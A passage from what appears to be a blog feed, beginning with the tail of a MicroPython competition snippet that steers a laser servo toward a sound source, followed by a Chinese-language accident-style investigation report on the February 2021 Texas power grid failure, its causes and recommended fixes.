    mic<span class="token punctuation">.</span>set_led<span class="token punctuation">(</span>img_b<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># If Ques 3</span>
    <span class="token keyword">if</span> KG0<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> KG1<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        arguments<span class="token punctuation">.</span>times <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">if</span> arguments<span class="token punctuation">.</span>times <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
            Laser<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token comment"># Angle</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>img_b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> img_b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>
            angle_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+=</span> img_b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i <span class="token operator">*</span> math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">6</span><span class="token punctuation">)</span>
            angle_params<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> img_b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> math<span class="token punctuation">.</span>cos<span class="token punctuation">(</span>i <span class="token operator">*</span> math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">6</span><span class="token punctuation">)</span>
    angle_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>angle_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>
    angle_params<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>angle_params<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> angle_params<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        angle_params<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">180</span>
    <span class="token keyword">if</span> angle_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">and</span> angle_params<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
        angle_params<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">360</span>
    <span class="token keyword">if</span> angle_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token keyword">or</span> angle_params<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> angle_params<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            angle_params<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">90</span> <span class="token keyword">if</span> angle_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">270</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            angle_params<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> angle_params<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>degrees<span class="token punctuation">(</span>math<span class="token punctuation">.</span>atan<span class="token punctuation">(</span>angle_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">/</span> angle_params<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token comment"># Determine the scope</span>
        <span class="token keyword">if</span> <span class="token number">90</span> <span class="token operator">&lt;</span> angle_params<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">270</span><span class="token punctuation">:</span>
            angle_params<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> arguments<span class="token punctuation">.</span>Angle_last <span class="token operator">*</span> <span class="token number">0.1</span> <span class="token operator">+</span> angle_params<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">0.9</span>
            kalman_filter<span class="token punctuation">(</span>arguments<span class="token punctuation">,</span> angle_params<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            arguments<span class="token punctuation">.</span>Angle_last <span class="token operator">=</span> angle_params<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
            show_angle <span class="token operator">=</span> <span class="token number">180</span> <span class="token operator">-</span> angle_params<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>

            <span class="token comment"># Check Ques 3</span>
            <span class="token keyword">if</span> KG0<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> KG1<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                Laser<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
                servo<span class="token punctuation">(</span>Servo_laser<span class="token punctuation">,</span> show_angle<span class="token punctuation">)</span>

            lcd<span class="token punctuation">.</span>draw_string<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"Angle: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>show_angle<span class="token punctuation">)</span><span class="token punctuation">,</span> lcd<span class="token punctuation">.</span>BLUE<span class="token punctuation">,</span> lcd<span class="token punctuation">.</span>BLACK<span class="token punctuation">)</span>
            lcd<span class="token punctuation">.</span>draw_string<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token string">"Distance: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">275</span> <span class="token operator">/</span> math<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token operator">-</span>show_angle <span class="token operator">*</span> math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lcd<span class="token punctuation">.</span>BLUE<span class="token punctuation">,</span>
                            lcd<span class="token punctuation">.</span>BLACK<span class="token punctuation">)</span>
            lcd<span class="token punctuation">.</span>fill_rectangle<span class="token punctuation">(</span><span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            location <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">108</span> <span class="token operator">+</span> math<span class="token punctuation">.</span>tan<span class="token punctuation">(</span><span class="token operator">-</span>show_angle <span class="token operator">*</span> math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">180</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">48</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>show_angle<span class="token punctuation">,</span> location<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">&lt;</span> location <span class="token operator">&lt;</span> <span class="token number">200</span><span class="token punctuation">:</span>
                lcd<span class="token punctuation">.</span>fill_rectangle<span class="token punctuation">(</span><span class="token number">251</span><span class="token punctuation">,</span> location<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

            <span class="token comment"># Check Ques 4</span>
            <span class="token keyword">if</span> KG0<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> KG1<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                arguments<span class="token punctuation">.</span>JD <span class="token operator">=</span> angle_params<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
                Laser<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
                error <span class="token operator">=</span> arguments<span class="token punctuation">.</span>JD <span class="token operator">-</span> arguments<span class="token punctuation">.</span>pid
                arguments<span class="token punctuation">.</span>pid <span class="token operator">+=</span> error <span class="token operator">*</span> <span class="token number">0.1</span>
                arguments<span class="token punctuation">.</span>output <span class="token operator">=</span> <span class="token operator">-</span>arguments<span class="token punctuation">.</span>pid
                <span class="token keyword">if</span> <span class="token operator">-</span><span class="token number">270</span> <span class="token operator">&lt;</span> arguments<span class="token punctuation">.</span>output <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">90</span><span class="token punctuation">:</span>
                    servo<span class="token punctuation">(</span>Servo_laser<span class="token punctuation">,</span> <span class="token number">180</span> <span class="token operator">+</span> arguments<span class="token punctuation">.</span>output<span class="token punctuation">)</span>
</code></pre>
]]></content>
      <categories>
        <category>竞赛</category>
      </categories>
      <tags>
        <tag>NUEDC</tag>
      </tags>
  </entry>
  <entry>
    <title>美国得克萨斯州2·14大停电</title>
    <url>/ee/PowerOutage/</url>
    <content><![CDATA[<h2 style="text-align:center;font-weight:700;color:#B399FF"><em>2021 Texas Power Crisis</em></h2>
<h3 id="作者前言">作者前言</h3>
<p>        该事故调查报告完全基于互联网分析，因此无法保证数据的准确性。同时还有以下注意要点<sup>[1]</sup>：</p>
<ul>
<li>本文档中的信息是初步信息，可能受到发生变化后统计不及时的影响。</li>
<li>就本文件而言，“停电”是发电机容量完全不可用，“减额”是该容量部分不可用。</li>
<li>图表中反映的所有发电机停机和降额值均基于发电机铭牌容量，即发电机制造商指定的最大可能 MW 输出。 由于风能和太阳能输出通常远低于指定的铭牌容量，因此用于编写本报告的这些单元的停电和降额 MW 值通常远高于在没有停电的情况下可用的实际电量或减额。</li>
<li>无法披露特定单元的停电原因，因为它们是受保护的信息。</li>
</ul>
<p>        本次报告的大部分数据来自于ERCOT（得州电力可靠性协会），部分观点可能来自统计学家或者专家分析。此外，该报告依据中华人民共和国应急管理部办公厅发布的相应要求<sup>[2]</sup>编写（字体、图表、排版以及部分细节等未进行格式规范）。</p>
<h2 style="text-align:center;font-weight:700;color:#000">美国得克萨斯州2·14特别重大电力安全事故调查报告</h2>
<h3 id="一、报告开篇和事故性质认定">一、报告开篇和事故性质认定</h3>
<p>        2021年得克萨斯州大停电是指美国得克萨斯州在2021年2月中因为极端天气而出现的大规模停电事件。高峰时得州有450万户家庭和企业停电，州内供水设施、食物供应链和网络通讯设施也受到影响。经调查认定，此次大停电事故是一起因寒潮这一直接原因造成的电力安全事故。</p>
<h3 id="二、事故基本情况">二、事故基本情况</h3>
<p>        为了更好地分析事故的起因以及影响，充分了解事故发生的地点、时间以及管理单位等关键信息是必需的。</p>
<h4 id="（一）事故发生单位及相关单位概况">（一）事故发生单位及相关单位概况</h4>
<p>        美国电网迄今已有100多年的建设发展历史，最初是由私营和公营电力公司根据各自的负荷和电源分布组成一个个孤立的电网，随后在互利原则基础上通过双边或多边协议、联合经营等方式相互联网，逐步形成了东部、西部和得克萨斯三大联合电网， 这三大联合电网之间仅由少数低容量的直流线路连接，分别占美国售电量的73%、19%和8%。美国的输电网纵横交错，常见的电压等级有765千伏、500千伏、345千伏、230千伏、161千伏、138千伏、115千伏。据美国能源信息署（EIA）统计， 2012年美国200千伏以上高压输电线路有30.7万公里，其中包括约3888公里的765千伏交流输电线路，以及3545 公里±500千伏直流输电线路<sup>[3]</sup>。从将各种电力资源可靠地整合到电网，到为北美三分之二的地区协调发电和输电，ISO 和 RTO 使发电与保持照明的需求即时匹配<sup>[4]</sup>。</p>
<img src="https://s2.loli.net/2023/11/01/8WTcldmvEYXaUqk.jpg" alt="图1 主要电网互联系统" style="zoom:50%;" />
<p>        而本次大停电事故发生地点在美国得克萨斯州，作为该地区的独立系统运营商，ERCOT 在连接超过 52,700 英里输电线路和 1,100 台发电机组（包括专用网络）的电网上安排电力。 它还为竞争激烈的批发大容量电力市场执行财务结算，并管理竞争选择区域中 800 万处场所的零售交换。 ERCOT 是一家会员制 501©(4) 非营利性公司，由董事会管理，并受德克萨斯州公用事业委员会和德克萨斯州立法机构的监督。 其成员包括消费者、合作社、发电商、电力营销商、零售电力供应商、投资者拥有的电力公司、输电和配电供应商以及市政拥有的电力公司<sup>[5]</sup>。</p>
<h4 id="（二）事故发生单位安全管理情况">（二）事故发生单位安全管理情况</h4>
<p>        早在2011年，ERCOT已经存在一套完整的紧急操作，该操作旨在解决 ERCOT 系统可靠性不足且没有显而易见的解决方案的的紧急情况<sup>[6]</sup>。</p>
<h4 id="（三）事故发生经过">（三）事故发生经过</h4>
<p>        2021年2月，得克萨斯州遭遇了一场重大电力危机，这是在2月10日至11日、13-17日、和15-20日横扫美国的三场严冬风暴期间发生的。 风暴引发了德克萨斯州历史上最严重的能源基础设施故障，导致水、食物和热量短缺<sup>[7]</sup>。 超过 450 万家庭和企业断电，有的断电好几天。 至少有246人直接或间接丧生，据估计，这场危机造成的死亡人数高达702人。</p>
<h4 id="（四）人员伤亡和直接经济损失情况">（四）人员伤亡和直接经济损失情况</h4>
<p>        到2月17日，至少有21人死于与冬季风暴有关的原因。 到2月19日，这一数字更新为至少32人死亡，死亡与一氧化碳中毒、车祸、溺水、房屋火灾和体温过低有关。2月21日，死亡人数增加到70人<sup>[8]</sup>。据估计，寒潮和冬季风暴造成的损失至少为 1950 亿美元。</p>
<h4 id="（五）其他情况">（五）其他情况</h4>
<ul>
<li>由于管道冻结和爆裂，超过 1200 万人的供水服务中断<sup>[9]</sup>。</li>
<li>恶劣的天气导致许多消防栓在紧急情况下无法使用。</li>
<li>由于停止和启动化石燃料基础设施（例如化工厂和燃料精炼厂）而导致污染物大量释放。</li>
<li>得克萨斯州的电网危机已经扩大到不仅仅是一场自然灾害和治理失败。</li>
<li>COVID-19疫苗的运送被延迟，无法正确储存疫苗的设施被要求将疫苗转移给可以储存疫苗的设施。</li>
<li>由于全州持续停电，许多人在家中面临冰冻温度。</li>
<li>…</li>
</ul>
<h3 id="三、事故应急处置及评估情况">三、事故应急处置及评估情况</h3>
<p>        从事故发生到结束，政府以及社区的事故应急处置能力以及紧急情况响应速度都对事故范围有着很大影响。</p>
<h4 id="（一）事故信息接报及响应情况">（一）事故信息接报及响应情况</h4>
<p>        州长阿博特于2月12日发布了一份灾难声明，据此他动员了包括德克萨斯军事部在内的各个部门进行除雪和援助滞留的驾车者。随着局势的恶化，州长阿博特于2月13日要求发表联邦紧急声明，拜登总统于2月14日批准了该声明。</p>
<p>        为了缓解能源短缺，州长阿博特命令天然气生产商不要将天然气出口到州外，而是在德克萨斯州内销售。他还呼吁 ERCOT 领导人辞职。前众议员 Beto O’Rourke 经营着一家虚拟电话银行，可以联系全州超过780,000名老年人。得克萨斯州科罗拉多市市长蒂姆·博伊德 (Tim Boyd) 发表评论批评市民没有为冬季风暴做准备，并表示：“强者生存，弱者灭亡”后，遭到强烈反对。 他在争议后辞职。</p>
<p>        2月14日，拜登总统宣布德克萨斯州进入紧急状态，授权国土安全部和联邦紧急事务管理局（FEMA）在德克萨斯州全境提供紧急援助。FEMA 向该州发送了 60 台发电机以及水和毯子。</p>
<p>        当地教堂、社区中心和其他地点为受影响的个人开设了暖气站，并要求提供物质和金钱捐赠以帮助受影响的人。几个当地的互助团体以物资的交付和分配作为回应，特别是在受灾最严重的休斯顿和奥斯汀地区。碧昂斯 (Beyoncé) 和瑞茜·威瑟斯彭 (Reese Witherspoon) 等名人与公司合作提供金钱救济，亲自捐款，并向社交媒体粉丝提供捐款链接，以提高救济和意识。 通过他的“我们是德克萨斯”虚拟慈善音乐会，Matthew McConaughey 和他的妻子 Camila Alves McConaughey 筹集了超过 770 万美元，以继续支持受风暴影响的人们。</p>
<p>        国会女议员亚历山大·奥卡西奥-科尔特斯组织了一场筹款活动，为受影响的德克萨斯人提供食物、水和住所，第一天就筹集了 200 万美元。她随后前往休斯敦与志愿者一起帮助康复。 她和其他民主党人一起参观了风暴留下的破坏以及配送中心和交付地点。 最后，她筹集了 470 万美元<sup>[10]</sup>。</p>
<h3 id="四、事故原因分析">四、事故原因分析</h3>
<p>        德克萨斯州的绝大多数家庭都配备了电加热器，其技术相当于烤面包机烤箱。在最严重的冷锋期间，居民们启动了那些效率低下的单位，有些人甚至打开和打开电烤箱并使用吹风机。结合事故发生的背景以及外内部因素等，事故的直接原因是：寒潮造成电力需求急剧升高，以及得克萨斯州的电力设备没有良好的防冻措施并且极端低温与冻雨天气导致的机组非计划停运、降功率运行及无法开机等发电侧故障。</p>
<h4 id="（一）直接原因分析">（一）直接原因分析</h4>
<p>        与极端天气相关的强制停电数量可能有多种触发因素，但总的来说，它们似乎分为两大类。这些类别是<sup>[11]</sup>：</p>
<ol>
<li>机组无法启动或维持与气候相关的运行状态，包括基于燃料的设施以及可再生能源（主要是风能）</li>
<li>优先权的减少或丧失将天然气重新分配给燃气设施。</li>
</ol>
<img src="https://s2.loli.net/2023/11/01/VlheS4dg7KinJcR.png" alt="图2 燃料减额量" style="zoom: 25%;" />
<p>        由极端低温、冻雨天气直接造成的发电侧故障是事故的首要原因。应该指出的是，风能资产受到了极大的关注，但事实表明，所有资源都受到了实质性影响，没有一类资源比其他资源受到的影响更大。结合图2的燃料减额量<sup>[12]</sup>注意到天然气以及风能供应占比较大而且都受到了很大影响。</p>
<p>        例如，风机叶片结冰可能导致风电机组非计划停运或降功率运行，发电厂控制和信号装置内测压水柱冻结可能引发装置误动，发电厂给水系统、通风系统、润滑系统等内部液体冻结可能导致设备无法正常工作等。在寒冷潮湿的条件下旋转的风力涡轮机叶片可以在其叶片宽一码的尖端积聚近一英尺厚的冰。这会破坏叶片空气动力学。 这破坏了整个涡轮机的平衡。 根据爱荷华州立大学 Martin C. Jischke 航空航天工程教授和该大学飞机结冰物理学和防/除冰主任 Hui Hu 领导的一项最近发表的实地研究，这可能会中断高达 80%的能源生产<sup>[13]</sup>。Hu 从事涡轮叶片结冰的实验室研究已有大约 10 年，包括在独特的 ISU 结冰研究隧道中进行实验。 其中大部分工作得到了爱荷华州能源中心和国家科学基金会的资助。</p>
<p>        一些风力涡轮机确实冻结了，但占该州发电量一半左右的天然气是造成短缺的主要原因。 工厂崩溃了，天然气供应链和管道也崩溃了。</p>
<p>        通常有两个与受恶劣天气事件影响的电网架构相关的组件：弹性和可靠性。电网弹性是承受电网压力事件而不会遭受操作损害或适应压力的能力。这主要是关于电网或电力消费者不会发生什么。 简而言之，弹性是电气系统在不持续断电的情况下应变或变形的能力。另一方面，可靠性是衡量弹性被破坏后的行为的指标。持续中断的开始是从弹性域到可靠性域的过渡点。</p>
<p>        在这个极端的冬季事件中，ERCOT 管理系统以满足在这个极端天气事件发生时 ERCOT 监管、运营和市场限制范围内的可靠性参数，以避免整个系统出现故障。紧急系统措施采用了减载，以避免电气系统完全受损。电网可靠性的主要组成部分之一是资源储备的可用性，可以在发电资源持续中断期间将其部署到电网。在这次事件中，在线发电和资源储备，包括备用和备用发电资源，都受到极端温度的影响，无法满足负荷需求。这反过来又需要减载以维持供需的实时平衡。</p>
<img src="https://s2.loli.net/2023/11/01/YXfVB4InqPgOoHQ.png" alt="图3 发电机停机以及减额原因" style="zoom: 33%;" />
<p>        图3中显示的停电容量随着周日风暴的到来而急剧增加，并从周一上午晚些时候到周三中午保持相当稳定。然而，如图4所示，停电的净水平掩盖了整个星期持续的发电可用性波动，在整个活动期间，发电机不断停运和投入使用。</p>
<img src="https://s2.loli.net/2023/11/01/39LCquPfxWMFGdA.png" alt="图4 增量式发电机停电和按小时降额" style="zoom: 33%;" />
<p>        极寒天气下机组燃料问题导致的发电侧故障是事故的第2个重要原因，而这部分故障中，以天然气为燃料的机组故障占87%，其他燃料导致的故障仅占13%。一方面，极端低温、冻雨天气使得天然气井井口发生冻结，道路交通运输条件也随之恶化，天然气设施的维修无法正常进行，为了防止冰冻带来的影响，部分天然气设施提前关停，这使得天然气产量大幅下降；另一方面，天然气设施的供电，也因极寒天气导致的电厂故障与负荷轮停而面临严重不足，这进一步限制了天然气的生产<sup>[14]</sup>。启动负荷轮停时的一大疏忽，恰恰在于没有将天然气设施作为关键负荷，保障其电力供应，导致了“正反馈”式的传播效应。由机组燃料问题引发的大量发电侧故障，与美国中南部及得州区域燃气机组装机容量占比过半以及电-气能源间的紧密耦合（electricity-gas interdependence）是密不可分的。</p>
<h4 id="（二）间接原因分析">（二）间接原因分析</h4>
<p>        1999年，得克萨斯州设定了可再生能源目标。如今，得州的风能占全美的30%左右。但此次供电系统的崩溃则使人们开始质疑得州的电力系统设计与其不断推进的可再生能源计划是否有一定风险。部分责任归咎于德克萨斯州电力市场的独特设计。 在美国 48 个相邻的州中，它是唯一一个拥有自己独立电网的州——得克萨斯互联。 这意味着当发电机发生故障时，该州无法从境外进口电力。但是即使存在跨州调节的可能性，与ERCOT相邻的SPP和MISO也因极寒天气而面临电力供应紧张，且彼此间的传输线也受天气影响多遇故障，导致ERCOT至多仅能从相邻电网受入略超100万千瓦的电力，也难以有效缓解电力供应危机。</p>
<p>        美国两党政客数十年以来一直在推动的对可再生能源的补贴，使得电网变得不稳定。与风能相较，煤炭和核能受到更严格的监管，这使得州等多地的燃煤电厂因缺乏竞争力而关闭。过去10年里，全美停止运营的燃煤电厂大约可为6000万户家庭提供电力。此外，许多核电站也陆续关闭。然而，电网对风能和太阳能等间歇性可再生能源的依赖程度越高，在供需发生巨大变化时的稳定性就越低。在质疑者看来，得州此次的电网崩溃显示出了可再生能源的风险与局限性。那么，寒潮过后该州面临着两个主要问题：是否要增加电力储备能力，以及如何确保电力设备应对极端天气的能力。</p>
<h3 id="五、有关责任单位存在的主要问题">五、有关责任单位存在的主要问题</h3>
<h4 id="（一）事故单位">（一）事故单位</h4>
<p>        运营电网的德克萨斯州电力可靠性委员会 (ercot) 没有正确预测风暴导致的能源需求是导致这次事故的一个潜在原因。 有人说这几乎是无法预测的，但在前一周就有关于即将到来的恶劣天气的警告，而 ercot 的预测非常短。 能源投资银行 Tudor, Pickering, Holt &amp; Co (tph) 的乔治·奥利里 (George O’Leary) 表示，去年夏天的限电已经表明电网缺乏过剩产能<sup>[15]</sup>。</p>
<p>        负荷的持续激增及发电机组的大面积停运使得整个电力系统的频率不断下降，在2月15日凌晨12点18分系统频率已降至正常线以下，因此，ERCOT在凌晨1点20分启动了两轮100万千瓦的负荷轮停，但频率仍在降低，情况最坏时留给ERCOT处理频率过低问题的时间只剩9分钟，否则将可能触发1700万千瓦的机组因频率过低而停机，并导致系统大停电。可见，ERCOT当时采取大规模的负荷轮停亦是无奈之举。</p>
<p>        在此事件之前，ERCOT 服务区域在 2011 年 2 月的第一周以及 1983 年、1989 年、2003 年、2006 年、2008 年和 2010 年经历了类似的极端寒冷天气事件。以下内容总结在执行摘要中2011 年 FERC 员工报告<sup>[16]</sup>：</p>
<blockquote>
<p>​	“进入 2011 年 2 月的暴风雨，无论是 ERCOT 还是在事件期间启动轮流停电的其他电力实体都预计无法满足客户需求。 根据预期的发电机可用性，它们都有足够的备用裕度。 但事实证明，这些储备不足以应对事件期间因跳闸、降额和启动失败而损失的大量容量。”</p>
</blockquote>
<p>        从本质上讲，该报告的结果似乎与2021年极端冬季风暴事件的结果一致。该报告的建议包括26条建议，以提高极端冬季天气事件期间的可靠性能。2011年和2021年极端天气事件的发生时间（2月）和类型都相似。然而，在2021年，由于强制停电以及由于强制停电而无法使用的机组总数，发电量损失明显增加。在2021年的活动期间，供不应求导致的频率偏差变得更加严重。鉴于建议是在2011年事件之后制定的，问题仍然是为什么类似的事件会产生类似的结果，但应该指出的是，2021年的事件在低温方面更为“极端”。</p>
<h4 id="（二）有关监管部门">（二）有关监管部门</h4>
<p>        根据 PJM 的强制执行标准，《联邦电力法》第 215 条要求电力可靠性组织 (ERO) 制定强制性和可执行的可靠性标准，这些标准须经 FERC 审查和批准。 根据委员会批准的与可靠性标准相关的 NERC 实施计划，委员会批准的可靠性标准在美国成为强制性的和可执行的。 根据 2005 年能源政策法案 (EPAct 2005)，国会通过添加与电网可靠性相关的新第 215 条，扩大了 FERC 在联邦电力法案 (FPA) 下的作用和管辖权。 FPA 第 215(e) 节授权委员会或电力可靠性组织（由 FERC 审查）对违反可靠性标准的大容量电力系统的用户、所有者或运营商处以罚款。</p>
<p>        由于 ERCOT 独立系统运营商管理的输电网仅位于德克萨斯州内，并未与美国其他地区同步互连，因此完全在 ERCOT 内发生的电能传输在某些情况下不受委员会管辖 《联邦权力法》的执行部分。 大容量电力系统的可靠性已通过 NERC 与 Texas RE 之间的授权协议进行授权，该协议将合规性和执法权授予 Texas RE，以确保大容量电力系统维持 NERC 可靠性标准。 确定 Texas RE 是否具有关于发电设施风化的合规和执法权限需要对 NERC 和 Texas RE 之间的 ERO 协议中的陈述进行更详细的评估。</p>
<h3 id="六、事故主要教训">六、事故主要教训</h3>
<p>        从1983年到2021年，相对于我国连续三十年无大停电事故，如此高频率的停电已经不是偶然因素导致。尽管事故后有应急处置、原因分析、后续调查等一系列流程化措施，但是数十年来仍得不到有效改观，甚至截至 2022 年 1 月，电力系统几乎没有变化，德克萨斯州仍然面临另一场冬季风暴中大停电的风险<sup>[17]</sup>。</p>
<p>        对于发电侧以及天然气供给侧均应在寒潮到来前做充足得组合预测，提前准备应急人员与建立互助项目等。虽然分散式电网管理体制增加电网规划、建设、运营协调难度，不利于电网协调可持续发展，以及美国电网产权分散、 管理分散，形成区域化发展格局，难以整合成协调统一的全国性电网。但是多年来相关企业得预测不准确及时以及事后设备改建不充分等要素共同导致了这次事故，只有相关企业能够加大改进力度，才能避免再次发生大面积停电事故。</p>
<h3 id="七、事故整改和防范措施">七、事故整改和防范措施</h3>
<h4 id="（一）对发电侧的建议">（一）对发电侧的建议</h4>
<ol>
<li>发电机所有者（Generator Owner，GO）应负责辨识容易受寒冷天气影响的发电设备或系统。</li>
<li>发电机所有者应对易受严寒影响的设备或系统明确并执行防冻保护措施，并每隔一段时间分析设备系统是否变化，是否需要额外的防冻措施。</li>
<li>发电机所有者在提供运行温度数据时需同时考虑降雨及冷风对机组运行的影响。</li>
<li>发电机所有者应审查出现故障的机组并制定修正行动方案（Corrective Action Plan，CAP），进一步修订往后的寒冷天气应对计划。</li>
<li>发电机所有者与发电机运行人员（Generator Operators，GOP）每年对每台机组都应开展针对寒冷天气预防计划的测试。</li>
<li>发电机所有者应改造现有机组，使其在规定温度与天气条件下（参考该地区的历史极端温度与天气）能够正常运行。</li>
<li>在计算寒冷天气下的可信容量并用于紧急运行调度时，发电机所有者应综合天然气的供应情况向功率平衡责任主体（Balancing Authorities，BA）提供可靠的可信容量预测，功率平衡责任主体应进一步综合自身判断向可靠性协调机构（Reliability Coordinators，RC）提供可靠预测，并据此制定应急管理计划。</li>
<li>发电机所有者应至少在入冬前、冬季中、收到极端天气的预报等时点，定期检查并维护机组的防冻措施。</li>
<li>为了向功率平衡责任主体提供准确信息，发电机所有者及发电机运行人员应明确所有与发电机组使用的天然气的购买和运输相关的可靠性风险。</li>
